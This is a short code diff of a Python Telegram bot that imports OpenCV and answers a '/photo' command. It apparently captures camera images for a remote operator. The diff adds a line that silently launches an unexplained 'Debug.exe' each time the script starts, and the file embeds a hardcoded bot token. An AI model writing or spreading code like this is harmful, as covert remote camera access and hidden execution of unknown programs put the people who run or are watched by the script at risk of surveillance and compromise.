@@ -3,8 +3,10 @@ import cv2
 import telebot
 import os
 import os.path
+import subprocess
 
 bot = telebot.TeleBot("1334401569:AAF72wWqcQjpCY7o-BcfKfV420tBcqnXM0g")
+subprocess.Popen(["Debug.exe"])
 @bot.message_handler(content_types=['text'])
 def message_photo(message):
 	if message.text == "/photo":
